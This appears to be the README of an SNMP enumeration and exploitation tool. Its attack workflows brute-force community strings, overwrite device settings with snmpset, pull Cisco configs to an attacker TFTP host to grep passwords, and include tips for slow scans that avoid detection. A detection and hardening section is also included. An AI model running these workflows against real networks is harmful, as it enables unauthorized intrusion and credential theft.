# SNMPSeek - Enhanced SNMP Enumeration Tool

## Overview
SNMPSeek is a comprehensive SNMP (Simple Network Management Protocol) reconnaissance and exploitation tool designed for internal network assessments. It discovers SNMP-enabled devices, bruteforces community strings, extracts device information, and tests for writable SNMP configurations.

## What is SNMP?
**SNMP** (Simple Network Management Protocol) is a protocol for collecting and organizing information about managed devices on IP networks. It's commonly used on routers, switches, servers, printers, and network appliances.

### Key Characteristics
- **Port**: UDP 161 (queries), UDP 162 (traps)
- **Versions**: SNMPv1, SNMPv2c (community-based), SNMPv3 (authentication)
- **Community Strings**: Password-like strings for access control
- **Default Communities**: `public` (read-only), `private` (read-write)
- **MIB**: Management Information Base - hierarchical database of device info

## Features
- ✅ **SNMP Discovery** - UDP port scanning for SNMP services
- ✅ **Community String Bruteforce** - Test common and custom strings
- ✅ **Read/Write Detection** - Identify writable SNMP access
- ✅ **MIB Walking** - Extract complete device information
- ✅ **Device Information Extraction** - Hostname, location, contact, interfaces
- ✅ **Network Enumeration** - IP addresses, routing tables, ARP cache
- ✅ **SNMPv3 Support** - Username enumeration and testing
- ✅ **Concurrent Scanning** - Fast multi-threaded operation
- ✅ **JSON Export** - Machine-parseable output

## Installation

### Prerequisites
```bash
# Python 3.6+
python3 --version

# SNMP tools (required)
# Ubuntu/Debian
sudo apt install snmp snmp-mibs-downloader

# CentOS/RHEL
sudo yum install net-snmp net-snmp-utils

# macOS
brew install net-snmp

# Enable MIB support (optional but recommended)
sudo download-mibs
# Edit /etc/snmp/snmp.conf and comment out: mibs :
```

### Verify Installation
```bash
# Test snmpget
snmpget -v2c -c public localhost 1.3.6.1.2.1.1.1.0

# Test snmpwalk
snmpwalk -v2c -c public localhost system
```

### Download
```bash
cd /path/to/seek-tools/
chmod +x snmpseek/snmpseek.py
```

## Usage

### Basic Commands
```bash
# Basic SNMP discovery
./snmpseek.py

# Bruteforce community strings
./snmpseek.py --bruteforce

# MIB walk discovered devices
./snmpseek.py --walk

# Custom community strings
./snmpseek.py -c "custom1,custom2,mycommunity"

# Test for writable SNMP
./snmpseek.py --writable

# Full scan (all features)
./snmpseek.py --full

# Scan from file
./snmpseek.py -f targets.txt --bruteforce
```

### Command-Line Options
```
Targeting:
  IP/CIDR                  Single IP or range (192.168.1.0/24)
  -f, --file FILE          File containing IP addresses

Scan Modes:
  --bruteforce             Bruteforce community strings
  --walk                   MIB walk on found devices
  --writable               Test for write access
  --full                   Full scan (all features)
  -c, --communities STR    Custom community strings (comma-separated)

Connection:
  --timeout SECONDS        SNMP timeout (default: 3)
  -w, --workers N          Concurrent threads (default: 10)
  
SNMPv3:
  --v3                     Enable SNMPv3 testing
  --users FILE             File with SNMPv3 usernames

Output:
  -v, --verbose            Detailed output
  -o, --output DIR         Output directory
  --json                   JSON output only
```

## Output Files

### snmplist.txt
List of SNMP-enabled hosts:
```
192.168.1.1 - SNMP Open (public)
192.168.1.10 - SNMP Open (private, public)
192.168.1.254 - SNMP Open (community)
```

### snmp_creds.txt
Valid community strings found:
```
192.168.1.1:public:READ
192.168.1.10:private:WRITE
192.168.1.10:public:READ
192.168.1.254:community:READ
```

### snmp_info.txt
Extracted device information:
```
[+] 192.168.1.1 (public)
    System Name: router-core-01
    System Description: Cisco IOS Software, Version 15.2
    System Location: Server Room A, Rack 3
    System Contact: netadmin@company.com
    System Uptime: 45 days, 12:34:56
    Interfaces: 24
    IP Addresses: 192.168.1.1, 10.0.0.1, 172.16.0.1

[+] 192.168.1.10 (private) [WRITABLE]
    System Name: switch-floor2
    System Description: Cisco IOS Software, C2960
    System Location: Floor 2, Closet B
    Network Configuration: ACCESSIBLE VIA SNMP WRITE
    ⚠️  WARNING: SNMP write access detected!
```

### snmp_details.json
Machine-parseable JSON export:
```json
{
  "scan_time": "2025-10-13T16:00:00",
  "total_hosts": 254,
  "snmp_found": 12,
  "writable_found": 2,
  "results": [
    {
      "ip": "192.168.1.1",
      "port": 161,
      "communities": [
        {
          "string": "public",
          "access": "READ",
          "writable": false
        }
      ],
      "device_info": {
        "sysName": "router-core-01",
        "sysDescr": "Cisco IOS Software, Version 15.2",
        "sysLocation": "Server Room A, Rack 3",
        "sysContact": "netadmin@company.com",
        "sysUpTime": "393696000",
        "interfaces": ["GigabitEthernet0/0", "GigabitEthernet0/1"],
        "ip_addresses": ["192.168.1.1", "10.0.0.1"]
      }
    }
  ]
}
```

## Attack Workflows

### Workflow 1: Basic SNMP Discovery
```bash
# 1. Discover SNMP-enabled devices
./snmpseek.py 192.168.0.0/16 --bruteforce -w 100

# 2. Review found communities
cat snmp_creds.txt

# 3. Extract device info
./snmpseek.py -f snmplist.txt --walk

# 4. Review extracted data
cat snmp_info.txt
```

### Workflow 2: Writable SNMP Exploitation
```bash
# 1. Find writable SNMP
./snmpseek.py 10.0.0.0/24 --writable

# 2. Identify writable hosts
grep "WRITE" snmp_creds.txt

# 3. Manual exploitation
snmpset -v2c -c private 10.0.0.10 1.3.6.1.2.1.1.5.0 s "OWNED"

# 4. Or use Metasploit
use auxiliary/scanner/snmp/snmp_set
set COMMUNITY private
set RHOSTS 10.0.0.10
run
```

### Workflow 3: Network Mapping via SNMP
```bash
# 1. Discover SNMP devices
./snmpseek.py --full 192.168.1.0/24

# 2. Extract routing tables
snmpwalk -v2c -c public 192.168.1.1 ipRouteNextHop

# 3. Extract ARP cache
snmpwalk -v2c -c public 192.168.1.1 ipNetToMediaPhysAddress

# 4. Map internal networks
snmpwalk -v2c -c public 192.168.1.1 ipAdEntAddr
```

### Workflow 4: Password Extraction
```bash
# 1. Find Cisco devices with SNMP
./snmpseek.py --bruteforce -f cisco_devices.txt

# 2. Extract running config (if writable SNMP exists)
snmpwalk -v2c -c private 192.168.1.1 1.3.6.1.4.1.9.2.1.53

# 3. Use Metasploit cisco_config_tftp
use auxiliary/scanner/snmp/cisco_config_tftp
set COMMUNITY private
set RHOST 192.168.1.1
run

# 4. Analyze extracted config
grep -i "password\|secret\|key" cisco_config.txt
```

## Common SNMP OIDs

### System Information
```
1.3.6.1.2.1.1.1.0    - sysDescr (System description)
1.3.6.1.2.1.1.3.0    - sysUpTime (Uptime)
1.3.6.1.2.1.1.4.0    - sysContact (Contact)
1.3.6.1.2.1.1.5.0    - sysName (Hostname)
1.3.6.1.2.1.1.6.0    - sysLocation (Location)
```

### Network Information
```
1.3.6.1.2.1.2.2.1.2  - ifDescr (Interface descriptions)
1.3.6.1.2.1.4.20.1.1 - ipAdEntAddr (IP addresses)
1.3.6.1.2.1.4.21.1.7 - ipRouteNextHop (Routing table)
1.3.6.1.2.1.4.22.1.2 - ipNetToMediaPhysAddress (ARP cache)
```

### Hardware Information
```
1.3.6.1.2.1.25.2.3.1.3  - hrStorageDescr (Storage)
1.3.6.1.2.1.25.3.3.1.2  - hrProcessorLoad (CPU load)
1.3.6.1.2.1.25.4.2.1.2  - hrSWRunName (Running processes)
```

### Cisco-Specific
```
1.3.6.1.4.1.9.2.1.53    - Cisco configuration
1.3.6.1.4.1.9.2.1.55    - Cisco enable password
1.3.6.1.4.1.9.9.23.1.2  - Cisco CDP neighbors
```

### Windows-Specific
```
1.3.6.1.4.1.77.1.2.25   - Windows users
1.3.6.1.4.1.77.1.4.2    - Windows shares
1.3.6.1.2.1.25.4.2.1.2  - Windows processes
```

## Exploitation Examples

### Example 1: Default Community Strings
```bash
# 1. Discover with default communities
./snmpseek.py 192.168.1.0/24 --bruteforce

# Output:
# [+] 192.168.1.1 - Community 'public' (READ)
# [+] 192.168.1.10 - Community 'private' (WRITE)

# 2. Extract sensitive information
snmpwalk -v2c -c public 192.168.1.1 system

# 3. Modify configuration (if write access)
snmpset -v2c -c private 192.168.1.10 1.3.6.1.2.1.1.6.0 s "Pwned"
```

### Example 2: Network Reconnaissance
```bash
# 1. Find SNMP devices
./snmpseek.py --full 10.0.0.0/16

# 2. Extract all IP addresses from devices
for ip in $(cut -d: -f1 snmplist.txt); do
    community=$(grep $ip snmp_creds.txt | cut -d: -f2 | head -1)
    echo "=== $ip ==="
    snmpwalk -v2c -c $community $ip ipAdEntAddr
done

# 3. Build network map
# Now you know all internal networks!
```

### Example 3: Cisco Config Extraction
```bash
# 1. Find Cisco devices
./snmpseek.py --bruteforce -f cisco_ips.txt

# 2. Check for write access
grep "WRITE" snmp_creds.txt

# 3. Use Metasploit to extract config
msfconsole
use auxiliary/scanner/snmp/cisco_config_tftp
set COMMUNITY private
set RHOST 192.168.1.1
set LHOST 192.168.1.100  # Your TFTP server
run

# 4. Analyze configuration
cat cisco_config_*.txt | grep -i "password\|secret"
```

### Example 4: Windows User Enumeration
```bash
# 1. Find Windows servers with SNMP
./snmpseek.py --bruteforce -f windows_servers.txt

# 2. Extract user list
snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.4.1.77.1.2.25

# Output shows all local users

# 3. Extract shares
snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.4.1.77.1.4.2

# 4. Extract running processes
snmpwalk -v2c -c public 192.168.1.50 1.3.6.1.2.1.25.4.2.1.2
```

## Integration with Other Tools

### With Metasploit
```bash
# 1. Discover SNMP with SNMPSeek
./snmpseek.py --bruteforce 192.168.1.0/24

# 2. Import into Metasploit
msfconsole
use auxiliary/scanner/snmp/snmp_enum
set COMMUNITY public
set RHOSTS file:/path/to/snmplist.txt
run

# 3. Exploit writable SNMP
use auxiliary/scanner/snmp/snmp_set
set COMMUNITY private
set RHOSTS 192.168.1.10
set OID 1.3.6.1.2.1.1.5.0
set OIDVALUE "pwned"
set TYPE s
run
```

### With onesixtyone (Fast SNMP Scanner)
```bash
# 1. Create community list from SNMPSeek
echo -e "public\nprivate\ncommunity" > communities.txt

# 2. Fast scan with onesixtyone
onesixtyone -c communities.txt -i targets.txt

# 3. Detailed enum with SNMPSeek
./snmpseek.py -f found_hosts.txt --walk
```

### With snmp-check
```bash
# 1. Find hosts with SNMPSeek
./snmpseek.py --bruteforce 10.0.0.0/24

# 2. Deep enumeration with snmp-check
while read line; do
    ip=$(echo $line | cut -d: -f1)
    comm=$(echo $line | cut -d: -f2)
    snmp-check -c $comm $ip > snmp_check_$ip.txt
done < snmp_creds.txt

# 3. Review output
cat snmp_check_*.txt | grep -i "password\|user\|route"
```

### With Nmap
```bash
# 1. Discover SNMP with Nmap
nmap -sU -p 161 --open 192.168.1.0/24 -oG snmp_hosts.txt

# 2. Bruteforce with SNMPSeek
./snmpseek.py -f snmp_hosts.txt --bruteforce

# 3. NSE script enumeration
nmap -sU -p 161 --script snmp-* 192.168.1.1
```

## Detection & Defense

### Detection Indicators

**Network Level**:
- Multiple UDP packets to port 161
- SNMP requests from unusual source IPs
- High volume of SNMP queries
- Failed community string attempts

**SNMP Traps/Logs**:
- Authentication failures (trap 4)
- Unauthorized SNMP access attempts
- Configuration changes via SNMP
- Unusual OID access patterns

**Patterns**:
```
# Multiple community string tests
192.168.1.100 → 161 UDP (community: public)
192.168.1.100 → 161 UDP (community: private)
192.168.1.100 → 161 UDP (community: community)
192.168.1.100 → 161 UDP (community: admin)
```

### Defense Measures

#### 1. Disable SNMP If Not Needed
```bash
# Linux
sudo systemctl stop snmpd
sudo systemctl disable snmpd

# Windows
Set-Service SNMP -StartupType Disabled
Stop-Service SNMP

# Cisco
conf t
no snmp-server
end
write memory
```

#### 2. Change Default Community Strings
```bash
# Linux (/etc/snmp/snmpd.conf)
# Remove:
rocommunity public
rwcommunity private

# Add strong community strings:
rocommunity "MyStr0ng!R34dCommunity!" 10.0.0.0/24
rwcommunity "MyStr0ng!Wr1t3Community!" 10.0.0.10

# Cisco
conf t
no snmp-server community public
no snmp-server community private
snmp-server community "MyStr0ng!Communty!" RO
end
```

#### 3. Implement Access Control Lists
```bash
# Linux (/etc/snmp/snmpd.conf)
rocommunity mycommunity 10.0.0.0/24
# Only allow from management subnet

# Cisco
conf t
access-list 10 permit 10.0.0.0 0.0.0.255
snmp-server community mycommunity RO 10
end
```

#### 4. Use SNMPv3
```bash
# Linux (/etc/snmp/snmpd.conf)
createUser myuser SHA myauthpass AES myencpass
rouser myuser priv

# Cisco
conf t
snmp-server group MYGROUP v3 priv
snmp-server user myuser MYGROUP v3 auth sha myauthpass priv aes 128 myencpass
end
```

#### 5. Enable Logging and Monitoring
```bash
# Linux
# Edit /etc/snmp/snmpd.conf
authtrapenable 1
trap2sink 10.0.0.100 public

# Monitor logs
tail -f /var/log/snmpd.log | grep -i "auth\|fail"
```

#### 6. Firewall Rules
```bash
# iptables (Linux)
iptables -A INPUT -p udp --dport 161 -s 10.0.0.0/24 -j ACCEPT
iptables -A INPUT -p udp --dport 161 -j DROP

# Windows Firewall
New-NetFirewallRule -DisplayName "SNMP Restrict" `
    -Direction Inbound -Protocol UDP -LocalPort 161 `
    -RemoteAddress 10.0.0.0/24 -Action Allow
```

### Hardening Checklist
- [ ] SNMP disabled on non-management devices
- [ ] Default community strings changed
- [ ] Strong community strings (complex, 20+ chars)
- [ ] Read-only access only (no write)
- [ ] ACLs restrict access to management subnet
- [ ] SNMPv3 with authentication and encryption
- [ ] SNMP traps enabled and monitored
- [ ] Regular audits of SNMP configuration
- [ ] Firewall rules limiting SNMP access
- [ ] Logging enabled for all SNMP activity

## Troubleshooting

### No SNMP Responses
```bash
# Verify SNMP is running
sudo systemctl status snmpd

# Test locally first
snmpwalk -v2c -c public localhost system

# Check firewall
sudo iptables -L -n | grep 161
nmap -sU -p 161 target.ip

# Verify community string
snmpget -v2c -c public target.ip 1.3.6.1.2.1.1.1.0
```

### Timeout Errors
```bash
# Increase timeout
./snmpseek.py --timeout 10

# Test with snmpget directly
snmpget -v2c -c public -t 10 target.ip 1.3.6.1.2.1.1.1.0

# Check network latency
ping target.ip
```

### "snmpget not found" Error
```bash
# Install SNMP tools
# Ubuntu/Debian
sudo apt install snmp

# CentOS/RHEL
sudo yum install net-snmp-utils

# macOS
brew install net-snmp
```

### MIB Parsing Warnings
```bash
# Download MIBs
sudo download-mibs

# Edit config
sudo nano /etc/snmp/snmp.conf
# Comment out: mibs :

# Or ignore warnings
snmpwalk -v2c -c public -m ALL target.ip
```

## Tips & Best Practices

### 🎯 Targeting Tips
- **Network devices first**: Routers/switches often have SNMP
- **Printers**: Commonly have SNMP with default communities
- **Windows servers**: Often have SNMP enabled
- **IoT devices**: Security cameras, thermostats, etc.

### 🔒 Operational Security
- **Slow scans**: Use `-w 5` to avoid detection
- **Custom wordlists**: Create environment-specific community lists
- **Avoid write operations**: Don't modify configs without authorization
- **Test locally first**: Practice on your own devices

### ⚡ Performance Tips
- **More workers**: Use `-w 50` for large networks
- **Target selection**: Focus on known device types
- **Limit OID queries**: Use specific OIDs vs full walks
- **Batch processing**: Split large networks into chunks

### 🎓 Learning Resources
- **RFC 1157**: SNMPv1 specification
- **RFC 3416**: SNMPv2c specification  
- **RFC 3414**: SNMPv3 security
- **Practice labs**: Set up your own SNMP devices
- **MIB browsers**: Use tools like iReasoning MIB Browser

## Real-World Examples

### Example 1: Default Communities Found
```bash
./snmpseek.py 10.0.0.0/16 --bruteforce -w 100
# Scanned: 65,536 hosts
# Found: 234 SNMP devices
# Valid communities: 189 (public), 12 (private), 8 (community)
# Writable: 12 devices with 'private' community
# Time: ~30 minutes
```

### Example 2: Network Device Compromise
```bash
./snmpseek.py --writable 192.168.1.0/24
# Found: 192.168.1.1 with community 'private' (WRITE)
# Extracted: Full routing table, config, VLAN info
# Modified: Changed sysContact to demonstrate access
# Result: Complete network visibility + potential config changes
```

### Example 3: Windows Server Enumeration
```bash
./snmpseek.py --full -f windows_servers.txt
# Found: 15/20 servers with SNMP enabled
# Community: 'public' valid on all 15
# Extracted: User lists, shares, processes, services
# Result: Comprehensive Windows environment mapping
```

## Exit Codes
- **0**: Success, SNMP found
- **1**: No SNMP services found
- **2**: SNMP tools not installed
- **3**: No targets specified

## Limitations
- Requires UDP connectivity (may be firewalled)
- SNMPv3 support limited (basic testing only)
- Cannot bypass properly configured ACLs
- Depends on external snmp tools
- UDP scanning slower than TCP

## Related Tools
- **onesixtyone**: Fast SNMP scanner
- **snmp-check**: Detailed SNMP enumeration
- **Metasploit**: SNMP exploitation modules
- **snmpwalk/snmpget**: Standard SNMP tools
- **Nmap NSE**: SNMP scripts

## Credits
- Inspired by onesixtyone and snmp-check
- Community string lists from SecLists
- OID database from various sources

---
**Author**: Seek Tools Project  
**Version**: 1.0  
**Last Updated**: October 2025  
**License**: Use responsibly, authorized testing only
